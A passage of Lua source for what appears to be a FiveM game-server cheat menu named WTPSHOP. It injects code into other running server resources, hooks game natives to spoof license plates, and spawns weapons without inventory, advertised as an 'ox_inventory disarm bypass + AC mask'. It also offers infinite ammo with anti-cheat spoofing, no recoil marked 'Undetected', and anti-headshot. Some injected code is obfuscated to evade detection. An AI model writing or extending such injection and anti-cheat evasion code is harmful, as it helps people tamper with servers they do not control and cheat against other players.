                                            if WTPSHOP.Native(DoesWeaponTakeWeaponComponent, currentWep, comp) then
                                                WTPSHOP.Native(GiveWeaponComponentToPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Magazine" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local components = {0xED265A1C, 0xD67B4F2D, 0x249A17D5, 0xD9D3AC92, 0x7B0033B3, 0x64F9C62B, 0xCE8C0772, 0x5ED6C128, 0x33BA12E8, 0x81786CA9, 0x10E6BA2B, 0x350966FB, 0xBB46E417, 0x937ED0B7, 0xB9835B2E, 0xB92C6979, 0x334A5203, 0x82158B86, 0xB16A3CD}
                                        for _, comp in ipairs(components) do 
                                            if WTPSHOP.Native(DoesWeaponTakeWeaponComponent, currentWep, comp) then
                                                WTPSHOP.Native(GiveWeaponComponentToPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Flashlight" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local flashlights = {0x7BC4CD10, 0x43FD5F0E, 0xC7AE6C97, 0xA196D98C}
                                        for _, comp in ipairs(flashlights) do 
                                            if WTPSHOP.Native(DoesWeaponTakeWeaponComponent, currentWep, comp) then
                                                WTPSHOP.Native(GiveWeaponComponentToPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Scopes" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local scopes = {
                                            0xC2CC3929, 0x9D2FBA71, 0xA27457FC, 0x5F333923, 
                                            0xC16479C7, 0x3CC6BD52, 0x1621AD14, 0x435976C4
                                        }
                                        for _, comp in ipairs(scopes) do 
                                            if WTPSHOP.Native(DoesWeaponTakeWeaponComponent, currentWep, comp) then
                                                WTPSHOP.Native(GiveWeaponComponentToPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Grip" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local grips = {0xC7086851, 0xE5264706}
                                        for _, comp in ipairs(grips) do 
                                            if WTPSHOP.Native(DoesWeaponTakeWeaponComponent, currentWep, comp) then
                                                WTPSHOP.Native(GiveWeaponComponentToPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            icon = "",
                            type = "scrollable",
                            value = 1,
                            values = { "Suppressor", "Magazine", "Flashlight", "Scopes", "Grip"},
                            label = "Remove",
                            onSelect = function(value)
                                if value == "Suppressor" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local components = {0x65EA7EBB, 0x837445AA, 0xA73D4664, 0xC304849A, 0xE608B35E, 0xC6654D78, 0x448892A, 0x3CC6BD52}
                                        for _, comp in ipairs(components) do 
                                            if WTPSHOP.Native(HasPedGotWeaponComponent, ped, currentWep, comp) then
                                                WTPSHOP.Native(RemoveWeaponComponentFromPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Magazine" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local components = {0xED265A1C, 0xD67B4F2D, 0x249A17D5, 0xD9D3AC92, 0x7B0033B3, 0x64F9C62B, 0xCE8C0772, 0x5ED6C128, 0x33BA12E8, 0x81786CA9, 0x10E6BA2B, 0x350966FB, 0xBB46E417, 0x937ED0B7, 0xB9835B2E, 0xB92C6979, 0x334A5203, 0x82158B86, 0xB16A3CD}
                                        for _, comp in ipairs(components) do 
                                            if WTPSHOP.Native(HasPedGotWeaponComponent, ped, currentWep, comp) then
                                                WTPSHOP.Native(RemoveWeaponComponentFromPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Flashlight" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local flashlights = {0x7BC4CD10, 0x43FD5F0E, 0xC7AE6C97, 0xA196D98C}
                                        for _, comp in ipairs(flashlights) do 
                                            if WTPSHOP.Native(HasPedGotWeaponComponent, ped, currentWep, comp) then
                                                WTPSHOP.Native(RemoveWeaponComponentFromPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Scopes" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local scopes = {0xC2CC3929, 0x9D2FBA71, 0xA27457FC, 0x5F333923, 0xC16479C7, 0x3CC6BD52, 0x1621AD14, 0x435976C4}
                                        for _, comp in ipairs(scopes) do 
                                            if WTPSHOP.Native(HasPedGotWeaponComponent, ped, currentWep, comp) then
                                                WTPSHOP.Native(RemoveWeaponComponentFromPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Grip" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local grips = {0xC7086851, 0xE5264706}
                                        for _, comp in ipairs(grips) do 
                                            if WTPSHOP.Native(HasPedGotWeaponComponent, ped, currentWep, comp) then
                                                WTPSHOP.Native(RemoveWeaponComponentFromPed, ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            type = "slider",
                            label = "Refill Ammo",
                            desc = "Ammo refill into the current weapon.",
                            scrollType = "onEnter",
                            value = 1,
                            min = 1,
                            max = 300,
                            step = 1.0,
                            onSelect = function(value)
                                if not WTPSHOP:EnsureCombatBypassReady("Refill Ammo") then return end
                                ApiRasclat.RouteFeature("weapons", [[
                                    local ped = WTPSHOP.Native(PlayerPedId)
                                    local found, currentWep = WTPSHOP.Native(GetCurrentPedWeapon, ped, true)
                                    
                                    if found and currentWep ~= WTPSHOP.Native(GetHashKey, "WEAPON_UNARMED") then
                                        WTPSHOP.Native(SetPedAmmo, ped, currentWep, ]] .. math.floor(value) .. [[)
                                    end
                                ]])
                            end
                        },
                        {
                            type = "scrollable-checkbox",
                            label = "Spoof Weapon (No Item)",
                            desc = "Spawns the weapon in your hand without backpack/inventory. ox_inventory disarm bypass + AC mask.",
                            scrollType = "onScroll",
                            checked = false,
                            value = 1,
                            values = WTPSHOP:BuildMenuFromWeaponList({
                                "weapon_pistol", "weapon_combatpistol", "weapon_appistol", "weapon_pistol50",
                                "weapon_microsmg", "weapon_smg", "weapon_assaultsmg",
                                "weapon_assaultrifle", "weapon_carbinerifle", "weapon_advancedrifle",
                                "weapon_pumpshotgun", "weapon_sawnoffshotgun",
                                "weapon_sniperrifle", "weapon_heavysniper",
                            }),
                            onSelect = function(displayLabel, checked)
                                local model = WTPSHOP:GetWeaponModelFromLabel(displayLabel)
                                WTPSHOP:EnableInventorySpoofWeapon(checked, model)
                            end
                        },
                        {
                            type = "button",
                            label = "Spoof Custom Weapon (No Item)",
                            desc = "Type weapon name (e.g. WEAPON_CARBINERIFLE) — no inventory required.",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "WEAPON_", function(val)
                                    if val and val ~= "" then
                                        WTPSHOP:EnableInventorySpoofWeapon(true, val:lower())
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "checkbox", label = "Infinite Ammo (Stealth)", desc = "Clip refill + AC ammo spoof. Requires bypass ready.", checked = false,
                            onSelect = function(checked)
                                WTPSHOP:EnableInfiniteAmmo(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Headshot",
                            checked = false,
                            desc = "This will prevent you from being headshot.",
                            onSelect = function(checked)
                                if checked then
                                    self:Notify("success", "WTPSHOP", "Enabled Anti-Headshot", 5000)
                                    ApiRasclat.Monitor([[
                                        _G.AntiHeadshot = true
                                        WTPSHOP.Thread(function()
                                            local lastHealth = WTPSHOP.Native(GetEntityHealth, WTPSHOP.Native(PlayerPedId))
                                            while _G.AntiHeadshot do
                                                local ped = WTPSHOP.Native(PlayerPedId)
                                                WTPSHOP.Native(SetPedSuffersCriticalHits, ped, false)

                                                local health = WTPSHOP.Native(GetEntityHealth, ped)
                                                local _, bone = WTPSHOP.Native(GetPedLastDamageBone, ped)

                                                if bone == 31086 and health < lastHealth then
                                                    WTPSHOP.Native(SetEntityHealth, ped, lastHealth)
                                                    WTPSHOP.Native(ClearPedLastDamageBone, ped)
                                                else
                                                    lastHealth = health
                                                end

                                                WTPSHOP.Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        _G.AntiHeadshot = false
                                        WTPSHOP.Native(SetPedSuffersCriticalHits, WTPSHOP.Native(PlayerPedId), true)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Ignore Max Range",
                            desc = "Allows you to ignore max range.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode(targetRes, [[
                                        _G.IgnoreMaxActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.IgnoreMaxActive do
                                                WTPSHOP.Native(Wait, 0)
                                                local ped = PlayerPedId()
                                                WTPSHOP.Native(SetPedResetFlag, ped, 95, WTPSHOP.Native(GetMaxRangeOfCurrentPedWeapon, ped) < 250.0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode(targetRes, [[
                                        _G.IgnoreMaxActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "No Recoil",
                            desc = "Undetected.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode(targetRes, [[
                                        _G.NoRecoilActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.NoRecoilActive do
                                                WTPSHOP.Native(Wait, 0)
                                                local cam = WTPSHOP.Native(GetRenderingCam)
                                                WTPSHOP.Native(StopGameplayCamShaking, true)
                                                WTPSHOP.Native(StopCamShaking, cam, true)
                                                ShakeGameplayCam = function(shakeName, intensity)
                                                    return 1
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode(targetRes, [[
                                        _G.NoRecoilActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "No Aim Blocking",
                            desc = "Allows aiming even when normally blocked.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode(targetRes, [[
                                        _G.NoAimActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.NoAimActive do
                                                WTPSHOP.Native(SetWeaponsNoAimBlocking, true)
                                                Wait(1000)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode(targetRes, [[
                                        _G.NoAimActive = false
                                        WTPSHOP.Native(SetWeaponsNoAimBlocking, false)
                                    ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "ph ph-car",
            label = "Vehicle Options",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "divider", label = "All Vehicles" },
                        { type = "button", label = "Scan Vehicle Addon's",
                            onSelect = function()
                                executeCode('any', [[
                                    WTPSHOP.Thread(function()
                                        local function FindCustomVehicles()
                                            Citizen.Wait(500)
                                            
                                            local vehicleNames = {}
                                            local foundVehicles = 0
                                            
                                            local targetFiles = {
                                                'vehicles.meta',
                                                'carvariations.meta',
                                                'handling.meta',
                                                'vehiclelayouts.meta'
                                            }
                                            
                                            print('^2[Vehicle Finder] Starting search for custom vehicles in meta files...^0')
                                            
                                            for i = 0, GetNumResources() - 1 do
                                                local resourceName = GetResourceByFindIndex(i)
                                                if resourceName and GetResourceState(resourceName) == 'started' then
                                                    for _, targetFile in ipairs(targetFiles) do
                                                        local fileContent = LoadResourceFile(resourceName, targetFile)
                                                        
                                                        if fileContent then
                                                            if targetFile == 'vehicles.meta' or targetFile == 'carvariations.meta' then
                                                                for modelName in fileContent:gmatch('<modelName>([^<]+)</modelName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                                
                                                                for modelName in fileContent:gmatch('modelName="([^"]+)"') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                            
                                                            if targetFile == 'handling.meta' then
                                                                for modelName in fileContent:gmatch('<handlingName>([^<]+)</handlingName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                            
                                                            if targetFile == 'vehiclelayouts.meta' then
                                                                for modelName in fileContent:gmatch('<layout>([^<]+)</layout>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                        end
                                                        
                                                        local streamFile = LoadResourceFile(resourceName, 'stream/' .. targetFile)
                                                        if streamFile then
                                                            if targetFile == 'vehicles.meta' or targetFile == 'carvariations.meta' then
                                                                for modelName in streamFile:gmatch('<modelName>([^<]+)</modelName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                            
                                                            if targetFile == 'handling.meta' then
                                                                for modelName in streamFile:gmatch('<handlingName>([^<]+)</handlingName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            print('^2================================^0')
                                            print('^2    CUSTOM VEHICLES^0')
                                            print('^2================================^0')
                                            
                                            if next(vehicleNames) then
                                                local count = 0
                                                local sortedVehicles = {}
                                                
                                                for name, _ in pairs(vehicleNames) do
                                                    table.insert(sortedVehicles, name)
                                                    count = count + 1
                                                end
                                                
                                                table.sort(sortedVehicles)
                                                
                                                print(string.format('^3Custom vehicles found in the Server: %d^0', count))
                                                print('^2--------------------------------^0')
                                                
                                                for _, name in ipairs(sortedVehicles) do
                                                    print(string.format('^7    %s^0', name))
                                                end
                                            else
                                                print('^1    No custom vehicles found in the Server^0')
                                            end
                                            
                                            print('^2================================^0')
                                            print('^2[Vehicle Finder] Search completed!^0')
                                        end
                                        
                                        FindCustomVehicles()
                                    end)
                                ]])
                            end
                        },
                        { type = "button", label = "Addon",
                            onSelect = function()
                                KeyboardInput("Addon Vehicle", "", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedVehicle(val)
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sedans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asea", "asea2", "asterope", "asterope2", "cinquemila", "driftchavosv6", "cog55", "cog552", "cognoscenti", "cognoscenti2", "deity", "hardy", "drifthardy", "emperor", "emperor2", "emperor3", "fugitive", "glendale", "glendale2", "impaler5", "ingot", "intruder", "minimus", "limo2", "premier", "primo", "primo2", "regina", "rhinehart", "romero", "schafter2", "schafter5", "schafter6", "stafford", "stanier", "stratum", "stretch", "superd", "surge", "tailgater", "tailgater2", "warrener", "warrener2", "washington" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "SUVs",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "aleutian", "astron", "baller", "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "bjxl", "cavalcade", "cavalcade2", "cavalcade3", "contender", "dorado", "dubsta", "dubsta2", "everon3", "fq2", "granger", "granger2", "gresley", "habanero", "huntley", "issi8", "iwagen", "jubilee", "landstalker", "landstalker2", "mesa", "mesa2", "novak", "patriot", "patriot2", "radi", "rebla", "rocoto", "seminole", "seminole2", "serrano", "squaddie", "toros", "vivanite", "woodlander", "xls", "xls2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Coupes",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "cogcabrio", "driftfr36", "exemplar", "f620", "felon", "felon2", "fr36", "jackal", "kanjosj", "oracle", "oracle2", "postlude", "previon", "sentinel", "sentinel2", "windsor", "windsor2", "zion", "zion2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Muscles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "blade", "brigham", "broadway", "buccaneer", "buccaneer2", "buffalo4", "buffalo5", "chino", "chino2", "clique", "clique2", "coquette3", "deviant", "dominator", "dominator2", "dominator3", "dominator4", "dominator5", "dominator6", "dominator7", "dominator8", "dominator9", "driftdominator10", "driftyosemite", "dukes", "dukes2", "dukes3", "ellie", "eudora", "faction", "faction2", "faction3", "gauntlet", "gauntlet2", "gauntlet3", "gauntlet4", "gauntlet5", "driftgauntlet4", "greenwood", "hermes", "hotknife", "hustler", "impaler", "impaler2", "impaler3", "impaler4", "impaler6", "imperator", "imperator2", "imperator3", "lurcher", "manana2", "moonbeam", "moonbeam2", "nightshade", "peyote2", "phoenix", "picador", "ratloader", "ratloader2", "ruiner", "ruiner2", "ruiner3", "ruiner4", "sabregt", "sabregt2", "slamvan", "slamvan2", "slamvan3", "slamvan4", "slamvan5", "slamvan6", "stalion", "stalion2", "tahoma", "tampa", "tampa3", "tampa4", "tulip", "tulip2", "vamos", "vigero", "vigero2", "vigero3", "virgo", "virgo2", "virgo3", "voodoo", "voodoo2", "weevil2", "yosemite", "yosemite2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports Classic",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "ardent", "btype", "btype2", "btype3", "casco", "cheburek", "cheetah2", "cheetah3", "coquette2", "deluxo", "dynasty", "fagaloa", "feltzer3", "gt500", "infernus2", "jb700", "jb7002", "mamba", "manana", "michelli", "monroe", "nebula", "peyote", "peyote3", "pigalle", "rapidgt3", "retinue", "retinue2", "savestra", "stinger", "stingergt", "stromberg", "swinger", "toreador", "torero", "tornado", "tornado2", "tornado3", "tornado4", "tornado5", "tornado6", "turismo2", "viseris", "z190", "zion3", "ztype" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports",
                            type = "scrollable",
                            value = 1,
                            values = { "alpha", "banshee", "bestiagts", "blista2", "blista3", "buffalo", "buffalo2", "buffalo3", "calico", "carbonizzare", "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "coquette", "coquette4", "corsita", "coureur", "cypher", "drafter", "drifteuros", "driftfuto", "driftjester", "driftremus", "drifttampa", "driftzr350", "elegy", "elegy2", "euros", "everon2", "feltzer2", "flashgt", "furoregt", "fusilade", "futo", "futo2", "gauntlet6", "gb200", "growler", "hotring", "imorgon", "issi7", "italigto", "italirsx", "jester", "jester2", "jester3", "jester4", "jugular", "khamelion", "komoda", "kuruma", "kuruma2", "locust", "lynx", "massacro", "massacro2", "neo", "neon", "ninef", "ninef2", "omnis", "omnisegt", "panthere", "paragon", "paragon2", "pariah", "penumbra", "penumbra2", "r300", "raiden", "rapidgt", "rapidgt2", "rapidgt4", "raptor", "remus", "revolter", "rt3000", "ruston", "schafter3", "schafter4", "schlagen", "schwarzer", "sentinel3", "sentinel4", "sentinel5", "seven70", "sm722", "specter", "specter2", "stingertt", "streiter", "sugoi", "sultan", "sultan2", "sultan3", "surano", "tampa2", "tenf", "tenf2", "tropos", "vectre", "verlierer2", "veto", "veto2", "vstr", "zr350", "zr380", "zr3802", "zr3803" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Super",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "adder", "autarch", "banshee2", "bullet", "champion", "cheetah", "cyclone", "deveste", "emerus", "entity2", "entity3", "entityxf", "fmj", "furia", "gp1", "ignus", "infernus", "italigtb", "italigtb2", "krieger", "le7b", "lm87", "nero", "nero2", "osiris", "penetrator", "pfister811", "prototipo", "reaper", "s80", "sc1", "scramjet", "sheava", "sultanrs", "suzume", "t20", "taipan", "tempesta", "tezeract", "thrax", "tigon", "torero2", "turismo3", "turismor", "tyrant", "tyrus", "vacca", "vagner", "vigilante", "virtue", "visione", "voltic", "voltic2", "xa21", "zeno", "zentorno", "zorrusso" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Motorcycles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "akuma", "avarus", "bagger", "bati", "bati2", "bf400", "carbonrs", "chimera", "cliffhanger", "daemon", "daemon2", "deathbike", "deathbike2", "deathbike3", "defiler", "diablous", "diablous2", "double", "enduro", "esskey", "faggio", "faggio2", "faggio3", "fcr", "fcr2", "gargoyle", "hakuchou", "hakuchou2", "hexer", "innovation", "lectro", "manchez", "manchez2", "manchez3", "nemesis", "nightblade", "oppressor", "oppressor2", "pcj", "powersurge", "ratbike", "reever", "rrocket", "ruffian", "sanchez", "sanchez2", "sanctus", "shinobi", "shotaro", "sovereign", "stryder", "thrust", "vader", "vindicator", "vortex", "wolfsbane", "zombiea", "zombieb" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Off-Road",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bfinjection", "bifta", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "bodhi2", "boor", "brawler", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2", "brutus3", "caracara", "caracara2", "dloader", "draugur", "driftl352", "dubsta3", "dune", "dune2", "dune3", "dune4", "dune5", "freecrawler", "hellion", "insurgent", "insurgent2", "insurgent3", "kalahari", "kamacho", "l35", "l352", "marshall", "menacer", "mesa3", "monster", "monster3", "monster4", "monster5", "monstrociti", "nightshark", "outlaw", "patriot3", "rancherxl", "rancherxl2", "ratel", "rcbandito", "rebel", "rebel2", "riata", "sandking", "sandking2", "technical", "technical2", "technical3", "terminus", "trophytruck", "trophytruck2", "vagrant", "verus", "winky", "yosemite3", "zhaba" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Industrial",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bulldozer", "cutter", "dump", "flatbed", "flatbed2", "guardian", "handler", "mixer", "mixer2", "rubble", "tiptruck", "tiptruck2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Utility",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "airtug", "armytanker", "armytrailer", "armytrailer2", "baletrailer", "boattrailer", "boattrailer2", "boattrailer3", "caddy", "caddy2", "caddy3", "docktrailer", "docktug", "forklift", "freighttrailer", "graintrailer", "mower", "proptrailer", "raketrailer", "ripley", "sadler", "sadler2", "scrap", "slamtruck", "tanker", "tanker2", "towtruck", "towtruck2", "towtruck3", "towtruck4", "tr2", "tr3", "tr4", "tractor", "tractor2", "tractor3", "trailerlarge", "trailerlogs", "trailers", "trailers2", "trailers3", "trailers4", "trailers5", "trailersmall", "trflat", "tvtrailer", "tvtrailer2", "utillitruck", "utillitruck2", "utillitruck3" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Vans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bison", "bison2", "bison3", "bobcatxl", "boxville", "boxville2", "boxville3", "boxville4", "boxville5", "boxville6", "burrito", "burrito2", "burrito3", "burrito4", "burrito5", "camper", "gburrito", "gburrito2", "journey", "journey2", "minivan", "minivan2", "paradise", "pony", "pony2", "rumpo", "rumpo2", "rumpo3", "speedo", "speedo2", "speedo4", "speedo5", "surfer", "surfer2", "surfer3", "taco", "youga", "youga2", "youga3", "youga4" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                    }
                },
                {
                    label = "Customization",
                    tabs = {
                        { type = "button", label = "Max All Tuning", desc = "Apply maximum performance and visual mods to your vehicle",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', [[
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 then
                                            WTPSHOP.Native(SetVehicleModKit, veh, 0)
                                            WTPSHOP.Native(SetVehicleWheelType, veh, 7)
                                            
                                            for i = 0, 16 do
                                                local max = GetNumVehicleMods(veh, i)
                                                if max and max > 0 then WTPSHOP.Native(SetVehicleMod, veh, i, max - 1, false) end
                                            end
                                            for i = 17, 22 do ToggleVehicleMod(veh, i, true) end

                                            WTPSHOP.Native(SetVehicleMod, veh, 23, 1, false)
                                            WTPSHOP.Native(SetVehicleMod, veh, 24, 1, false)
                                            for _, mod in ipairs({ 25, 27, 28, 30, 33, 34, 35 }) do
                                                local max = GetNumVehicleMods(veh, mod)
                                                if max and max > 0 then WTPSHOP.Native(SetVehicleMod, veh, mod, max - 1, false) end
                                            end
                                            local max38 = GetNumVehicleMods(veh, 38)
                                            if max38 and max38 > 0 then WTPSHOP.Native(SetVehicleMod, veh, 38, max38 - 1, true) end
                                            WTPSHOP.Native(SetVehicleWindowTint, veh, 1)
                                            WTPSHOP.Native(SetVehicleTyresCanBurst, veh, false)
                                            local currentProps = exports['jg-mechanic']:getVehicleProperties(veh)
                                            exports['jg-mechanic']:setVehicleProperties(veh, currentProps)
                                        end
                                    ]])
                                else
                                    executeCode('any', [[
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 then
                                            WTPSHOP.Native(SetVehicleModKit, veh, 0)
                                            WTPSHOP.Native(SetVehicleWheelType, veh, 7)
                                            for i = 0, 16 do
                                                local max = GetNumVehicleMods(veh, i)
                                                if max and max > 0 then WTPSHOP.Native(SetVehicleMod, veh, i, max - 1, false) end
                                            end
                                            for i = 17, 22 do ToggleVehicleMod(veh, i, true) end
                                            WTPSHOP.Native(SetVehicleMod, veh, 23, 1, false)
                                            WTPSHOP.Native(SetVehicleMod, veh, 24, 1, false)
                                            for _, mod in ipairs({ 25, 27, 28, 30, 33, 34, 35 }) do
                                                local max = GetNumVehicleMods(veh, mod)
                                                if max and max > 0 then WTPSHOP.Native(SetVehicleMod, veh, mod, max - 1, false) end
                                            end
                                            local max38 = GetNumVehicleMods(veh, 38)
                                            if max38 and max38 > 0 then WTPSHOP.Native(SetVehicleMod, veh, 38, max38 - 1, true) end
                                            WTPSHOP.Native(SetVehicleWindowTint, veh, 1)
                                            WTPSHOP.Native(SetVehicleTyresCanBurst, veh, false)
                                        end
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Vehicle Options" },
                        {
                            type = "button",
                            label = "Set License Plate",
                            onSelect = function()
                                KeyboardInput("Set License Plate", "", function(val)
                                    if val and val ~= "" then
                                        local injectedCode = string.format([[
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsUsing(ped)
                                            if veh and veh ~= 0 then
                                                local originalPlate = GetVehicleNumberPlateText(veh)
                                                local hookedVeh = veh
                                                MachoHookNative(0x7CE1CCB9B293020E, function(vehicle)
                                                    if vehicle == hookedVeh then
                                                        return false, originalPlate
                                                    end
                                                    return true, GetVehicleNumberPlateText(vehicle)
                                                end)
                                                SetVehicleNumberPlateText(veh, "%s")
                                            end
                                        ]], val)

                                        executeCode("any", injectedCode)
                                    else
                                        WTPSHOP:Notify("Invalid input", "Please enter a valid license plate.", "error")
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Repair Vehicle",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode("jg-mechanic", [[
                                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if not vehicle then
                                            return
                                        end
                                        Framework.Client.RepairVehicle(vehicle)
                                    ]])
                                else
                                    executeCode('any', [[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end

                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end

                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function _w(n)
                                            return Citizen.Wait(n)
                                        end

                                        local ped = _g(_b("PlayerPedId"))()
                                        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
                                        
